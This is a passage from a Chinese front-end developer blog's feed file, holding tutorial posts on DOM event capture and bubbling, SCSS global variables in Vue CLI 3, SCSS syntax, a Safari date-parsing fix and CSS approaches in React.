href="#接下来我们就可以来说说【捕获，冒泡】" class="headerlink" title="接下来我们就可以来说说【捕获，冒泡】"></a>接下来我们就可以来说说<em>【捕获，冒泡】</em></h4><h4 id="为了更清楚，我们可以用一张图来表示"><a href="#为了更清楚，我们可以用一张图来表示" class="headerlink" title="为了更清楚，我们可以用一张图来表示"></a>为了更清楚，我们可以用一张图来表示</h4><p><img src="/Blog/2019/10/31/essay/DOM%E4%BA%8B%E4%BB%B6%E4%B9%8B%E3%80%90%E6%8D%95%E8%8E%B7%EF%BC%8C%E5%86%92%E6%B3%A1%E3%80%91/index/img.png"></p><blockquote><p>左边就是参数为 <code>true</code> 的状态（捕获阶段）， 右边就是 <code>false</code> 的状态（冒泡阶段），<br>所以就有了<strong>先捕获在冒泡</strong>这一说法</p></blockquote><h5 id="对着这张图我们再来看一段代码（虽然很无聊，因为没人会这么写）"><a href="#对着这张图我们再来看一段代码（虽然很无聊，因为没人会这么写）" class="headerlink" title="对着这张图我们再来看一段代码（虽然很无聊，因为没人会这么写）"></a>对着这张图我们再来看<a href="http://js.jirengu.com/hunur/1/edit?html,js,console,output">一段代码</a>（虽然很无聊，因为没人会这么写）</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grand.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn1&#x27;</span>)</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">father.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn2&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">son.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f3</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn3&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>答案也很显然易见，为 <code>true</code> 的先执行，也就是 <code>fn1=&gt;fn3=&gt;fn2</code></p><h3 id="到此，【捕获、冒泡就应该已经讲完了】"><a href="#到此，【捕获、冒泡就应该已经讲完了】" class="headerlink" title="到此，【捕获、冒泡就应该已经讲完了】"></a>到此，【捕获、冒泡就应该已经讲完了】</h3><h2 id="但是有一个特例！！！"><a href="#但是有一个特例！！！" class="headerlink" title="但是有一个特例！！！"></a>但是有一个特例！！！</h2><h5 id="就是如下的情况时，当【捕获、冒泡】在同一个元素上时（也虽然很无聊）"><a href="#就是如下的情况时，当【捕获、冒泡】在同一个元素上时（也虽然很无聊）" class="headerlink" title="就是如下的情况时，当【捕获、冒泡】在同一个元素上时（也虽然很无聊）"></a>就是<a href="http://js.jirengu.com/gedaj/1/edit?html,js,console,output">如下的情况</a>时，当【捕获、冒泡】在同一个元素上时（也虽然很无聊）</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">son.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f3</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn3冒泡&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">son.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f3</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn3捕获&#x27;</span>)</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure><blockquote><p>按照上图或者理论（先捕获再冒泡）说法，应该是 <code>fn3捕获=&gt;fn3冒泡</code><br>但是实际情况却是<br>当【捕获、冒泡】在同一个元素上时，那就是 <strong>按照书写顺序来，谁先写，就先执行</strong><br>上述代码执行结果就应该是 <code>fn3冒泡=&gt;fn3捕获</code></p></blockquote><p>end</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue-Cli 3 引入 SCSS 全局变量</title>
      <link href="/Blog/2019/10/18/scss/Vue-Cli-3%E5%BC%95%E5%85%A5SCSS%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/index/"/>
      <url>/Blog/2019/10/18/scss/Vue-Cli-3%E5%BC%95%E5%85%A5SCSS%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/index/</url>
      
        <content type="html"><![CDATA[<h2 id="首先创建一个全局变量文件-global-scss"><a href="#首先创建一个全局变量文件-global-scss" class="headerlink" title="首先创建一个全局变量文件 global.scss"></a>首先创建一个全局变量文件 <code>global.scss</code></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$theme</span>-<span class="attribute">color</span>: <span class="number">#efefef</span>;</span><br></pre></td></tr></table></figure><h2 id="编辑-vue-config-js"><a href="#编辑-vue-config-js" class="headerlink" title="编辑 vue.config.js"></a>编辑 <code>vue.config.js</code></h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">module.<span class="attr">exports</span> <span class="operator">=</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="symbol">  css:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">    loaderOptions:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">      sass:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="comment">// 根据自己样式文件的位置调整</span></span><br><span class="line"><span class="symbol">        data:</span> `@import <span class="string">&quot;@/styles/global.scss&quot;</span><span class="punctuation">;</span>`</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;;</span></span><br></pre></td></tr></table></figure><h2 id="现在就可以在任意地方使用global-scss中定义的变量了"><a href="#现在就可以在任意地方使用global-scss中定义的变量了" class="headerlink" title="现在就可以在任意地方使用global.scss中定义的变量了"></a>现在就可以在任意地方使用global.scss中定义的变量了</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">&quot;scss&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: $theme-color;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="如此简单"><a href="#如此简单" class="headerlink" title="如此简单"></a>如此简单</h2>]]></content>
      
      
      <categories>
          
          <category> SCSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SCSS基础语法</title>
      <link href="/Blog/2019/10/15/scss/SCSS%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/index/"/>
      <url>/Blog/2019/10/15/scss/SCSS%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/index/</url>
      
        <content type="html"><![CDATA[<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$<span class="built_in">red</span>-<span class="type">color</span>: #<span class="number">6</span>f0; <span class="comment">// 变量</span></span><br><span class="line">.<span class="property">userCard</span> &#123;</span><br><span class="line">  <span class="built_in">width</span>: <span class="number">100</span>px;</span><br><span class="line">  &amp;.<span class="property">active</span> &#123; <span class="comment">// &amp;符号</span></span><br><span class="line">    <span class="built_in">background</span>: yellow;</span><br><span class="line">  &#125;</span><br><span class="line">  &amp;-name &#123;</span><br><span class="line">    <span class="type">color</span>: black;</span><br><span class="line">    &amp;:hover &#123;</span><br><span class="line">      <span class="type">color</span>: $<span class="built_in">red</span>-<span class="type">color</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    font: &#123; <span class="comment">// 属性连写时</span></span><br><span class="line">      <span class="built_in">size</span>: <span class="number">28</span>px;</span><br><span class="line">      weight: bold;</span><br><span class="line">      family: <span class="string">&#x27;Courier New&#x27;</span>, Courier, monospace;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="一、变量以-开头"><a href="#一、变量以-开头" class="headerlink" title="一、变量以 $ 开头"></a>一、变量以 <code>$</code> 开头</h1><h1 id="二、-amp-、-类似与js的模版字符串的变量写法-font-size"><a href="#二、-amp-、-类似与js的模版字符串的变量写法-font-size" class="headerlink" title="二、&amp;、#{}(类似与js的模版字符串的变量写法#{$font-size})"></a>二、&amp;、#{}(类似与js的模版字符串的变量写法<code>#&#123;$font-size&#125;</code>)</h1><p>以下写法会被翻译成</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.userCard</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  &amp;<span class="selector-class">.active</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: yellow;</span><br><span class="line">  &#125;</span><br><span class="line">  &amp;-name &#123;</span><br><span class="line">    <span class="attribute">color</span>: black;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.userCard</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.userCard</span><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.userCard-name</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: black;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、属性连写"><a href="#三、属性连写" class="headerlink" title="三、属性连写"></a>三、属性连写</h1><p>以下写法</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.userCard-name</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: black;</span><br><span class="line">    <span class="attribute">font</span>: &#123;</span><br><span class="line">      size: <span class="number">28px</span>;</span><br><span class="line">      weight: bold;</span><br><span class="line">      family: <span class="string">&#x27;Courier New&#x27;</span>, Courier, monospace;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等同于</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.userCard-name</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: black;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">28px</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;Courier New&#x27;</span>, Courier, monospace;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="四、加减乘除运算（特别注意-在某些情况下会被css当作简写属性的间隔符）"><a href="#四、加减乘除运算（特别注意-在某些情况下会被css当作简写属性的间隔符）" class="headerlink" title="四、加减乘除运算（特别注意/在某些情况下会被css当作简写属性的间隔符）"></a>四、加减乘除运算（特别注意<code>/</code>在某些情况下会被css当作简写属性的间隔符）</h1><h1 id="五、函数"><a href="#五、函数" class="headerlink" title="五、函数"></a>五、函数</h1><p>一个响应式移动端的函数栗子：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">function</span> <span class="title">px</span>($npx) &#123;</span><br><span class="line">    @<span class="keyword">return</span> <span class="type">$npx/375</span> * <span class="number">100</span>vw;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>六、@content</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line">@<span class="keyword">mixin</span> phone &#123;</span><br><span class="line">  @media (max-width: <span class="number">500</span>px) &#123;</span><br><span class="line">    @content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line">@include phone &#123;</span><br><span class="line">  <span class="comment">/* // 这一注释部分会被直接代替上面函数`@content`</span></span><br><span class="line"><span class="comment">  &gt; ul &#123;</span></span><br><span class="line"><span class="comment">    display: none;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SCSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>javascript - ios 时间显示NaN</title>
      <link href="/Blog/2019/08/23/essay/javascript-ios%E6%97%B6%E9%97%B4%E6%98%BE%E7%A4%BANaN/index/"/>
      <url>/Blog/2019/08/23/essay/javascript-ios%E6%97%B6%E9%97%B4%E6%98%BE%E7%A4%BANaN/index/</url>
      
        <content type="html"><![CDATA[<p>今天在做订单中心的时候，ios端出现如下时间错误。</p><p><img src="/Blog/2019/08/23/essay/javascript-ios%E6%97%B6%E9%97%B4%E6%98%BE%E7%A4%BANaN/index/img.png"></p><p>终发现原来 <code>new Date()</code> 在 <strong>安卓</strong> 和 <strong>ios</strong> 上的不同表现</p><p>当我们用<a href="#">JavaScript</a>实例化一个日期对象时，我们可以这样用：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="built_in">date</span> = <span class="literal">new</span> <span class="built_in">Date</span>(); </span><br></pre></td></tr></table></figure><p>上面这段代码是获取当前日期，这段代码在 <code>Firefox、Chrome、Safari</code> 浏览器中都可以运行。但是如果我想根据字符串获取日期，问题就来了。看下面代码。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="built_in">date</span> = <span class="literal">new</span> <span class="built_in">Date</span>(<span class="string">&quot;2019-08-23 08:00&quot;</span>);  <span class="comment">// Safari 在解析 ‘-’ 时间时会出错</span></span><br></pre></td></tr></table></figure><p>这段代码是获得字符中指定的日期，它 <code>Firefox、Chrome</code> 中就能运行，但是放在 <code>Safari</code> 就会报错，错误是 <code>NaN</code></p><h2 id="终发现，只要写成如下格式就可以修复NAN的“BUG”了"><a href="#终发现，只要写成如下格式就可以修复NAN的“BUG”了" class="headerlink" title="终发现，只要写成如下格式就可以修复NAN的“BUG”了"></a>终发现，只要写成如下格式就可以修复NAN的“BUG”了</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="built_in">date</span> = <span class="literal">new</span> <span class="built_in">Date</span>(<span class="string">&quot;2019/08/23 08:00&quot;</span>);  </span><br></pre></td></tr></table></figure><p>写了个正则，替换一下！</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dateTime.<span class="built_in">replace</span>(<span class="regexp">/-/g</span>, <span class="string">&quot;/&quot;</span>);</span><br></pre></td></tr></table></figure><p>end。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>高效学习 react 笔记七：react 里的 css 方案</title>
      <link href="/Blog/2019/07/02/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%83%EF%BC%9Areact%E9%87%8C%E7%9A%84css%E6%96%B9%E6%A1%88/index/"/>
      <url>/Blog/2019/07/02/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%83%EF%BC%9Areact%E9%87%8C%E7%9A%84css%E6%96%B9%E6%A1%88/index/</url>
      
        <content type="html"><![CDATA[<h2 id="传统的css方案"><a href="#传统的css方案" class="headerlink" title="传统的css方案"></a>传统的css方案</h2><h4 id="css-in-html"><a href="#css-in-html" class="headerlink" title="css in html"></a>css in html</h4><p>直接在 <code>html</code> 里面写 <code>css</code> 或者用 <code>link</code> 引入</p><p>像这个样子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS IN HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span> // 这个样子</span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"> // 或者这个样子</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>react 里的 css 方案</p><h4 id="css-in-react"><a href="#css-in-react" class="headerlink" title="css in react"></a>css in react</h4><p>也可以像传统的方式那样子引入 <code>css</code>，但是得用 <code>js</code> 的方法 <code>inport</code> 引入</p><p>像这样在 <code>style.css</code> 写好内容以后，在组件内引入即可生效</p><p><img src="/Blog/2019/07/02/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%83%EF%BC%9Areact%E9%87%8C%E7%9A%84css%E6%96%B9%E6%A1%88/index/img.png"></p><p>但是一但当我们的组件变得复杂时，问题就出现了：</p><p><img src="/Blog/2019/07/02/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%83%EF%BC%9Areact%E9%87%8C%E7%9A%84css%E6%96%B9%E6%A1%88/index/img_1.png"></p><p>我明明只想让 <code>App</code> 里面的 <code>class</code> 为 <code>title</code> 的元素变成红色，但 <code>Bar</code> 组件里面的 <code>title</code> 也同时被影响了！</p><h5 id="解决方法一：-在所有的组件样式前面加一个前缀，防止名字冲突"><a href="#解决方法一：-在所有的组件样式前面加一个前缀，防止名字冲突" class="headerlink" title="解决方法一： 在所有的组件样式前面加一个前缀，防止名字冲突"></a>解决方法一： 在所有的组件样式前面加一个前缀，防止名字冲突</h5><p><img src="/Blog/2019/07/02/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%83%EF%BC%9Areact%E9%87%8C%E7%9A%84css%E6%96%B9%E6%A1%88/index/img_2.png"></p><p>我们用 <code>.App-title</code> 才编写样式，防止了其他组件的冲突。</p><p>这种方式虽然写起来有点麻烦，但是还好能接受，大不了都加一个前缀。</p><p>但是大部分的 <code>react</code> 开发者觉得这种写前缀的方式就是很不爽，就是不想写前缀，然而 <code>css</code> 已经没有语法支持这么做了，于是他们又创造出了很多 <code>js</code> 库用来写 <code>css</code>。</p><h5 id="解决方法二：使用其他-css-in-js-库-多达几十种"><a href="#解决方法二：使用其他-css-in-js-库-多达几十种" class="headerlink" title="解决方法二：使用其他 css in js 库(多达几十种)"></a>解决方法二：使用其他 <code>css in js</code> 库(多达几十种)</h5><p>这里就讲一种 <code>github</code> 上 <code>star</code> 数量最多的库 <code>styled-components</code></p><ol><li>首先引入文件</li><li>然后新建一个变量</li><li>直接在组件中编写</li></ol><p><img src="/Blog/2019/07/02/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%83%EF%BC%9Areact%E9%87%8C%E7%9A%84css%E6%96%B9%E6%A1%88/index/img_3.png"></p><p>让我们再来看 <code>html</code> 上的结构</p><p><img src="/Blog/2019/07/02/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%83%EF%BC%9Areact%E9%87%8C%E7%9A%84css%E6%96%B9%E6%A1%88/index/img_4.png"></p><p>自动的加上了随机字符串，避免了想 <code>class</code> 名字和加前缀的烦恼</p><p>这好像有点强迫症的感觉~，但是现实就是这就是 <code>react</code> 世界里目前最流行的一种方案。</p><h5 id="还有一个就是现在-react-cli-已经自带的-css-module-方案"><a href="#还有一个就是现在-react-cli-已经自带的-css-module-方案" class="headerlink" title="还有一个就是现在 react cli 已经自带的 css module 方案"></a>还有一个就是现在 <code>react cli</code> 已经自带的 <code>css module</code> 方案</h5><p>1.首先正常编写 <code>css</code> 文件并命名为xx.module.css<br>2.引入<br>3.用js对象的形式取出css</p><p>css:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.color</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">&quot;./styles.module.css&quot;</span>;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">className</span>=<span class="string">&#123;styles.color&#125;</span>&gt;</span>ello React(Bar)<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/Blog/2019/07/02/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%83%EF%BC%9Areact%E9%87%8C%E7%9A%84css%E6%96%B9%E6%A1%88/index/img_5.png"></p><p>可以看到这里打印出来的对象，键就是我们编写的css类名，而值就是随机生成的css类名，</p><p>这样一来也同样达到了我们想要的效果。</p><p>如果一个元素要同时具有多个类名那么可以使用 <code>composes</code><br>此时可以这么编写css文件</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.color</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.Bar</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: sans-serif;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">color</span>: green;</span><br><span class="line">  <span class="comment">/*composes*/</span></span><br><span class="line">  composes: color;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">className</span>=<span class="string">&#123;styles.Bar&#125;</span>&gt;</span>ello React(Bar)<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/Blog/2019/07/02/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%83%EF%BC%9Areact%E9%87%8C%E7%9A%84css%E6%96%B9%E6%A1%88/index/img_6.png"></p><p>这样就让一个元素同时具有两个类名</p><blockquote><p>在react世界里使用css真是一件麻烦事儿，这点还真比不上vue的scope</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>高效学习 react 笔记六：生命周期</title>
      <link href="/Blog/2019/07/01/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E5%85%AD%EF%BC%9A%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/index/"/>
      <url>/Blog/2019/07/01/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E5%85%AD%EF%BC%9A%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/index/</url>
      
